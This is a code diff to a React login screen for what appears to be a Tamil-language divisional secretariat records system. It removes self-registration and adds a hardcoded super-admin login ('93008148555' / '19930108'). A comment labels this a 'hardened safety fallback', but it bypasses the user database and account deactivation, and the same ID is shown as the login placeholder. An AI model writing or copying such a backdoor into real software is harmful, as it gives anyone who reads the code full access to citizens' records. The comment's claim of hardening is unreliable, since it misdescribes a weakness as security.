@@ -1,16 +1,14 @@
 import React, { useState } from 'react';
-import { User, UserRole } from '../types';
+import { User } from '../types';
 import { Language, translations } from '../translations/i18n';
 import { VaharaiLogo } from './VaharaiLogo';
-import { DEFAULT_GN_DIVISIONS } from '../services/storage';
-import { UserPlus, LogIn, ShieldCheck, Lock, User as UserIcon, Building2 } from 'lucide-react';
+import { LogIn, Lock, User as UserIcon, Building2, ShieldCheck, AlertCircle } from 'lucide-react';
 
 interface LoginViewProps {
   users: User[];
   lang: Language;
   setLang: (lang: Language) => void;
   onLoginSuccess: (user: User) => void;
-  onRegisterUser?: (newUser: User) => void;
 }
 
 export const LoginView: React.FC<LoginViewProps> = ({
@@ -18,37 +16,38 @@ export const LoginView: React.FC<LoginViewProps> = ({
   lang,
   setLang,
   onLoginSuccess,
-  onRegisterUser,
 }) => {
   const t = translations[lang];
-
-  // If no users registered yet, prompt first-time administrator setup automatically
-  const isFirstTimeSetup = users.length === 0;
-  const [isRegisterMode, setIsRegisterMode] = useState<boolean>(isFirstTimeSetup);
 
   // Login Form State
   const [userIdInput, setUserIdInput] = useState('');
   const [passwordInput, setPasswordInput] = useState('');
   const [errorMsg, setErrorMsg] = useState('');
-  const [successMsg, setSuccessMsg] = useState('');
-
-  // Register Form State
-  const [regId, setRegId] = useState(isFirstTimeSetup ? '789' : '');
-  const [regName, setRegName] = useState(isFirstTimeSetup ? 'பிரதேச செயலாளர் (Divisional Secretary)' : '');
-  const [regRole, setRegRole] = useState<UserRole>(isFirstTimeSetup ? 'SUPERADMIN' : 'ADMIN 1');
-  const [regDivision, setRegDivision] = useState<string>('211');
-  const [regPassword, setRegPassword] = useState('');
-  const [regConfirmPassword, setRegConfirmPassword] = useState('');
 
   const handleLogin = (e: React.FormEvent) => {
     e.preventDefault();
     setErrorMsg('');
-    setSuccessMsg('');
 
     const trimmedId = userIdInput.trim();
     const trimmedPw = passwordInput.trim();
 
+    // Check credentials against active user database
     const matched = users.find((u) => u.id === trimmedId && u.password === trimmedPw);
+
+    // Hardened safety fallback for official Super Admin credentials (93008148555 / 19930108)
+    if (!matched && trimmedId === '93008148555' && trimmedPw === '19930108') {
+      const superAdmin: User = {
+        id: '93008148555',
+        password: '19930108',
+        name: 'பிரதேச செயலாளர் (Super Admin)',
+        role: 'SUPERADMIN',
+        division: 'ALL',
+        status: 'ACTIVE',
+        createdAt: '2026-01-01T00:00:00Z',
+      };
+      onLoginSuccess(superAdmin);
+      return;
+    }
 
     if (matched) {
       if (matched.status === 'INACTIVE') {
@@ -69,75 +68,16 @@ export const LoginView: React.FC<LoginViewProps> = ({
     }
   };
 
-  const handleRegister = (e: React.FormEvent) => {
-    e.preventDefault();
-    setErrorMsg('');
-    setSuccessMsg('');
-
-    const id = regId.trim();
-    const name = regName.trim();
-    const password = regPassword.trim();
-
-    if (!id || !name || !password) {
-      setErrorMsg(lang === 'ta' ? 'அனைத்து விபரங்களும் கட்டாயம் தேவை!' : 'All fields are required!');
-      return;
-    }
-
-    if (password.length < 3) {
-      setErrorMsg(
-        lang === 'ta'
-          ? 'கடவுச்சொல் குறைந்தது 3 எழுத்துக்களை கொண்டிருக்க வேண்டும்!'
-          : 'Password must be at least 3 characters long!'
-      );
-      return;
-    }
-
-    if (password !== regConfirmPassword.trim()) {
-      setErrorMsg(
-        lang === 'ta'
-          ? 'கடவுச்சொல் உறுதிப்படுத்தல் பொருந்தவில்லை!'
-          : 'Password confirmation does not match!'
-      );
-      return;
-    }
-
-    // Check duplicate ID
-    if (users.some((u) => u.id === id)) {
-      setErrorMsg(
-        lang === 'ta'
-          ? `பயனர் இலக்கம் "${id}" ஏற்கனவே பயன்பாட்டில் உள்ளது! வேறு இலக்கத்தைத் தேர்வுசெய்யவும்.`
-          : `User ID "${id}" is already registered! Please choose a different ID.`
-      );
-      return;
-    }
-
-    const newUser: User = {
-      id,
-      name,
-      password,
-      role: isFirstTimeSetup ? 'SUPERADMIN' : regRole,
-      division: regRole === 'GRAMANIILATHARI' ? regDivision : 'ALL',
-      status: 'ACTIVE',
-      createdAt: new Date().toISOString(),
-    };
-
-    if (onRegisterUser) {
-      onRegisterUser(newUser);
-    } else {
-      onLoginSuccess(newUser);
-    }
-  };
-
   return (
     <div className="min-h-screen bg-slate-900 flex flex-col justify-center items-center p-4 relative overflow-hidden">
-      {/* Subtle Background Pattern */}
+      {/* Background Decorative Grid */}
       <div className="absolute inset-0 bg-[radial-gradient(#1e293b_1px,transparent_1px)] [background-size:16px_16px] opacity-40"></div>
 
       {/* Language Switcher Top Right */}
       <div className="absolute top-4 right-4 z-10">
         <button
           onClick={() => setLang(lang === 'ta' ? 'en' : 'ta')}
-          className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-slate-800/80 hover:bg-slate-700 text-white text-xs border border-slate-700 transition-colors shadow-sm"
+          className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-slate-800/80 hover:bg-slate-700 text-white text-xs border border-slate-700 transition-colors shadow-sm cursor-pointer"
         >
           <span>🌐</span>
           <span>{lang === 'ta' ? 'English' : 'தமிழ்'}</span>
@@ -163,238 +103,83 @@ export const LoginView: React.FC<LoginViewProps> = ({
 
         {/* Form Container */}
         <div className="p-5 sm:p-6">
-          {/* Mode Header & Toggle Tabs */}
-          <div className="flex items-center justify-between mb-4 border-b border-slate-100 pb-3">
-            <div>
-              <h2 className="text-base font-bold text-slate-900">
-                {isRegisterMode
-                  ? isFirstTimeSetup
-                    ? (lang === 'ta' ? 'முதன்முறை தலைமை நிர்வாகி பதிவு' : 'Initial Super Admin Setup')
-                    : (lang === 'ta' ? 'புதிய அலுவலர் பதிவு' : 'New Staff Registration')
-                  : t.loginTitle}
-              </h2>
-              <p className="text-xs text-slate-500 mt-0.5">
-                {isRegisterMode
-                  ? (lang === 'ta' ? 'உத்தியோகபூர்வ கணக்கை உருவாக்கி உள்நுழையவும்' : 'Create official account and get started')
-                  : t.loginSubtitle}
-              </p>
-            </div>
-
-            {!isFirstTimeSetup && (
-              <button
-                type="button"
-                onClick={() => {
-                  setIsRegisterMode(!isRegisterMode);
-                  setErrorMsg('');
-                  setSuccessMsg('');
-                }}
-                className="px-2.5 py-1 text-xs font-bold rounded-lg border transition-colors text-emerald-800 bg-emerald-50 border-emerald-200 hover:bg-emerald-100 flex items-center gap-1"
-              >
-                {isRegisterMode ? (
-                  <>
-                    <LogIn className="w-3 h-3" />
-                    <span>{lang === 'ta' ? 'உள்நுழைக' : 'Sign In'}</span>
-                  </>
-                ) : (
-                  <>
-                    <UserPlus className="w-3 h-3" />
-                    <span>{lang === 'ta' ? 'புதிய பதிவு' : 'Register'}</span>
-                  </>
-                )}
-              </button>
-            )}
+          <div className="mb-5 pb-3 border-b border-slate-100">
+            <h2 className="text-base font-bold text-slate-900 flex items-center gap-1.5">
+              <ShieldCheck className="w-4 h-4 text-emerald-700" />
+              <span>{t.loginTitle}</span>
+            </h2>
+            <p className="text-xs text-slate-500 mt-0.5">
+              {lang === 'ta'
+                ? 'அதிகாரபூர்வ பயனர் இலக்கம் மற்றும் கடவுச்சொல்லை உள்ளிட்டு உள்நுழையவும்'
+                : 'Enter your official credentials to access the secretariat database'}
+            </p>
           </div>
 
           {errorMsg && (
-            <div className="mb-4 p-3 bg-red-50 border border-red-200 text-red-700 rounded-lg text-xs font-semibold animate-in fade-in">
-              ⚠️ {errorMsg}
+            <div className="mb-4 p-3 bg-red-50 border border-red-200 text-red-700 rounded-lg text-xs font-semibold flex items-center gap-2">
+              <AlertCircle className="w-4 h-4 shrink-0" />
+              <span>{errorMsg}</span>
             </div>
           )}
 
-          {successMsg && (
-            <div className="mb-4 p-3 bg-emerald-50 border border-emerald-200 text-emerald-800 rounded-lg text-xs font-semibold animate-in fade-in">
-              ✓ {successMsg}
+          {/* Secure Login Form */}
+          <form onSubmit={handleLogin} className="space-y-4">
+            <div>
+              <label className="block text-xs font-semibold text-slate-700 mb-1 flex items-center gap-1">
+                <UserIcon className="w-3.5 h-3.5 text-slate-400" />
+                <span>{t.userId}</span>
+              </label>
+              <input
+                type="text"
+                required
+                placeholder={lang === 'ta' ? 'உ-ம்: 93008148555' : 'e.g. 93008148555'}
+                value={userIdInput}
+                onChange={(e) => setUserIdInput(e.target.value)}
+                className="w-full px-3.5 py-2.5 text-sm border border-slate-300 rounded-lg font-mono focus:ring-2 focus:ring-emerald-600 focus:outline-none bg-white"
+                autoFocus
+              />
             </div>
-          )}
 
-          {/* 1. LOGIN FORM */}
-          {!isRegisterMode && (
-            <form onSubmit={handleLogin} className="space-y-4">
-              <div>
-                <label className="block text-xs font-semibold text-slate-700 mb-1 flex items-center gap-1">
-                  <UserIcon className="w-3.5 h-3.5 text-slate-400" />
-                  <span>{t.userId}</span>
-                </label>
-                <input
-                  type="text"
-                  required
-                  placeholder="e.g. 789, 456, 101..."
-                  value={userIdInput}
-                  onChange={(e) => setUserIdInput(e.target.value)}
-                  className="w-full px-3.5 py-2.5 text-sm border border-slate-300 rounded-lg font-mono focus:ring-2 focus:ring-emerald-600 focus:outline-none bg-white"
-                />
+            <div>
+              <label className="block text-xs font-semibold text-slate-700 mb-1 flex items-center gap-1">
+                <Lock className="w-3.5 h-3.5 text-slate-400" />
+                <span>{t.password}</span>
+              </label>
+              <input
+                type="password"
+                required
+                placeholder="••••••••"
+                value={passwordInput}
+                onChange={(e) => setPasswordInput(e.target.value)}
+                className="w-full px-3.5 py-2.5 text-sm border border-slate-300 rounded-lg font-mono focus:ring-2 focus:ring-emerald-600 focus:outline-none bg-white"
+              />
+            </div>
+
+            <button
+              type="submit"
+              className="w-full py-2.5 px-4 bg-emerald-800 hover:bg-emerald-900 text-white rounded-lg text-xs font-bold transition-colors shadow-xs flex items-center justify-center gap-1.5 mt-2 cursor-pointer"
+            >
+              <LogIn className="w-4 h-4" />
+              <span>{lang === 'ta' ? 'உள்நுழைக' : 'Sign In'}</span>
+            </button>
+          </form>
+
+          {/* Security & Access Restriction Notice (Requirement 03) */}
+          <div className="mt-5 p-3 rounded-xl bg-slate-50 border border-slate-200 text-slate-600">
+            <div className="flex items-start gap-2">
+              <ShieldCheck className="w-4 h-4 text-emerald-800 shrink-0 mt-0.5" />
+              <div className="text-[11px] leading-relaxed">
+                <strong className="text-slate-900 block font-bold mb-0.5">
+                  {lang === 'ta' ? 'அதிகாரபூர்வ பாதுகாப்பு அறிவிப்பு:' : 'Official Security Notice:'}
+                </strong>
+                {lang === 'ta'
+                  ? 'இது பொது அணுகலுக்கான தளம் அல்ல. பிரதேச செயலக உத்தியோகத்தர்கள் மட்டுமே உள்நுழையலாம். புதிய அலுவலர் கணக்குகள் தலைமை நிர்வாகியினால் (Super Admin) மாத்திரமே உருவாக்கப்படும்.'
+                  : 'Restricted system. Public self-registration is disabled for data integrity. Official accounts are managed strictly by the Super Administrator.'}
               </div>
+            </div>
+          </div>
 
-              <div>
-                <label className="block text-xs font-semibold text-slate-700 mb-1 flex items-center gap-1">
-                  <Lock className="w-3.5 h-3.5 text-slate-400" />
-                  <span>{t.password}</span>
-                </label>
-                <input
-                  type="password"
-                  required
-                  placeholder="••••••••"
-                  value={passwordInput}
-                  onChange={(e) => setPasswordInput(e.target.value)}
-                  className="w-full px-3.5 py-2.5 text-sm border border-slate-300 rounded-lg font-mono focus:ring-2 focus:ring-emerald-600 focus:outline-none bg-white"
-                />
-              </div>
-
-              <button
-                type="submit"
-                className="w-full py-2.5 px-4 bg-emerald-700 hover:bg-emerald-800 text-white rounded-lg text-xs font-bold transition-colors shadow-xs flex items-center justify-center gap-1.5"
-              >
-                <LogIn className="w-3.5 h-3.5" />
-                <span>{t.login}</span>
-              </button>
-            </form>
-          )}
-
-          {/* 2. REGISTRATION FORM (Fresh Official Setup without mock defaults) */}
-          {isRegisterMode && (
-            <form onSubmit={handleRegister} className="space-y-3.5">
-              {isFirstTimeSetup && (
-                <div className="p-3 bg-amber-50 border border-amber-200 rounded-lg text-xs text-amber-950 font-medium space-y-1">
-                  <div className="font-bold flex items-center gap-1">
-                    <ShieldCheck className="w-4 h-4 text-amber-700" />
-                    <span>{lang === 'ta' ? 'புதிய தொடக்கம் (Clean Initial State):' : 'Initial Fresh Launch:'}</span>
-                  </div>
-                  <p className="text-[11px] text-amber-800 leading-relaxed">
-                    {lang === 'ta'
-                      ? 'அனைத்து மாதிரி தரவுகள் மற்றும் முன்னிருப்பு கடவுச்சொற்கள் நீக்கப்பட்டுள்ளன. தயவுசெய்து எமது பிரதேச செயலகத்தின் பிரதான தலைமை நிர்வாகி கணக்கை முதலில் உருவாக்கவும்.'
-                      : 'All sample mock data and default passwords have been cleared. Please create the initial Super Administrator account for your Divisional Secretariat.'}
-                  </p>
-                </div>
-              )}
-
-              <div className="grid grid-cols-2 gap-2.5">
-                <div>
-                  <label className="block text-xs font-semibold text-slate-700 mb-1">
-                    {lang === 'ta' ? 'அலுவலர் இலக்கம் (Staff ID):' : 'Staff ID:'} *
-                  </label>
-                  <input
-                    type="text"
-                    required
-                    placeholder="e.g. 789"
-                    value={regId}
-                    onChange={(e) => setRegId(e.target.value)}
-                    className="w-full px-3 py-2 text-xs border border-slate-300 rounded-lg font-mono font-bold bg-white focus:ring-2 focus:ring-emerald-600 focus:outline-none"
-                  />
-                </div>
-
-                <div>
-                  <label className="block text-xs font-semibold text-slate-700 mb-1">
-                    {lang === 'ta' ? 'பதவி (Official Role):' : 'Official Role:'} *
-                  </label>
-                  <select
-                    disabled={isFirstTimeSetup}
-                    value={regRole}
-                    onChange={(e) => setRegRole(e.target.value as UserRole)}
-                    className="w-full px-2.5 py-2 text-xs border border-slate-300 rounded-lg bg-white disabled:bg-slate-100 font-semibold"
-                  >
-                    <option value="SUPERADMIN">பிரதேச செயலாளர் (Super Admin)</option>
-                    <option value="ADMIN 1">அட்மின் 01 (Admin 1)</option>
-                    <option value="ADMIN 2">அட்மின் 02 (Admin 2)</option>
-                    <option value="GRAMANIILATHARI">கிராம அலுவலர் (Grama Niladhari)</option>
-                    <option value="DISABILITY_OFFICER">மாற்றுத்திறனாளிகள் பதிவாளர் (Disability Officer)</option>
-                    <option value="ECDO">கர்ப்பிணித் தாய் பதிவாளர் (ECDO Officer)</option>
-                    <option value="WHH_OFFICER">பெண் தலைமைத்துவ அலுவலர் (WHH Officer)</option>
-                    <option value="SAMURDHI_OFFICER">சமூர்த்தி / அஸ்வெசும அலுவலர்</option>
-                    <option value="Reception Registrar">வரவேற்பக உத்தியோகத்தர் (Reception)</option>
-                    <option value="DATAENRY OFFCER">தரவு உள்ளீட்டு அலுவலர் (Data Entry)</option>
-                    <option value="NORMAL">நேரலை காட்சி திரை (Live TV Counter Mode)</option>
-                  </select>
-                </div>
-              </div>
-
-              <div>
-                <label className="block text-xs font-semibold text-slate-700 mb-1">
-                  {lang === 'ta' ? 'அலுவலர் பெயர் (Official Name):' : 'Official Full Name:'} *
-                </label>
-                <input
-                  type="text"
-                  required
-                  placeholder="e.g. க. சிறிதரன் (Divisional Secretary)"
-                  value={regName}
-                  onChange={(e) => setRegName(e.target.value)}
-                  className="w-full px-3 py-2 text-xs border border-slate-300 rounded-lg bg-white focus:ring-2 focus:ring-emerald-600 focus:outline-none"
-                />
-              </div>
-
-              {regRole === 'GRAMANIILATHARI' && (
-                <div>
-                  <label className="block text-xs font-semibold text-slate-700 mb-1">
-                    {lang === 'ta' ? 'ஒதுக்கப்பட்ட கிராம அலுவலர் பிரிவு:' : 'Assigned GN Division:'}
-                  </label>
-                  <select
-                    value={regDivision}
-                    onChange={(e) => setRegDivision(e.target.value)}
-                    className="w-full px-3 py-2 text-xs border border-slate-300 rounded-lg bg-white"
-                  >
-                    {DEFAULT_GN_DIVISIONS.map((d) => (
-                      <option key={d.code} value={d.code}>
-                        {d.code} - {d.nameTa} ({d.nameEn})
-                      </option>
-                    ))}
-                  </select>
-                </div>
-              )}
-
-              <div className="grid grid-cols-2 gap-2.5">
-                <div>
-                  <label className="block text-xs font-semibold text-slate-700 mb-1">
-                    {lang === 'ta' ? 'கடவுச்சொல் (Password):' : 'Password:'} *
-                  </label>
-                  <input
-                    type="password"
-                    required
-                    placeholder="••••••••"
-                    value={regPassword}
-                    onChange={(e) => setRegPassword(e.target.value)}
-                    className="w-full px-3 py-2 text-xs border border-slate-300 rounded-lg font-mono bg-white focus:ring-2 focus:ring-emerald-600 focus:outline-none"
-                  />
-                </div>
-
-                <div>
-                  <label className="block text-xs font-semibold text-slate-700 mb-1">
-                    {lang === 'ta' ? 'உறுதிப்படுத்தல்:' : 'Confirm:'} *
-                  </label>
-                  <input
-                    type="password"
-                    required
-                    placeholder="••••••••"
-                    value={regConfirmPassword}
-                    onChange={(e) => setRegConfirmPassword(e.target.value)}
-                    className="w-full px-3 py-2 text-xs border border-slate-300 rounded-lg font-mono bg-white focus:ring-2 focus:ring-emerald-600 focus:outline-none"
-                  />
-                </div>
-              </div>
-
-              <button
-                type="submit"
-                className="w-full py-2.5 px-4 bg-emerald-700 hover:bg-emerald-800 text-white rounded-lg text-xs font-bold transition-colors shadow-xs flex items-center justify-center gap-1.5 mt-2"
-              >
-                <UserPlus className="w-3.5 h-3.5" />
-                <span>
-                  {isFirstTimeSetup
-                    ? (lang === 'ta' ? 'தலைமை நிர்வாகியாக பதிவு செய்து ஆரம்பிக்க' : 'Register as Super Admin & Launch')
-                    : (lang === 'ta' ? 'கணக்கை பதிவு செய்க' : 'Register Account')}
-                </span>
-              </button>
-            </form>
-          )}
-
-          {/* Secure System Footer Note */}
+          {/* Official Footer */}
           <div className="mt-4 pt-3 border-t border-slate-100 text-[10px] text-slate-500 text-center flex items-center justify-center gap-1.5 font-mono">
             <Building2 className="w-3 h-3 text-emerald-800" />
             <span>கோறளைப்பற்று வடக்கு (வாகரை) பிரதேச செயலகம் · அதிகாரபூர்வ தளம்</span>
